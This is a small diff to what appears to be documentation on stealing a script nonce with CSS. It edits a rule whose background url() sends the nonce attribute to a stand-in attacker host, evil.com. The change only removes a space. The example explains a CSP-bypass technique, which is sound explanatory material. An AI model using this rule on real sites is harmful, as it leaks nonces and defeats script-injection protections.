@@ -78,7 +78,7 @@ from content attributes like this:
 script[nonce]::after {
   content: attr(nonce);
   color: transparent;
-  background: url("https://evil.com/steal-nonce?nonce=" attr(nonce));
+  background: url("https://evil.com/steal-nonce?nonce="attr(nonce));
 }
 ```
 
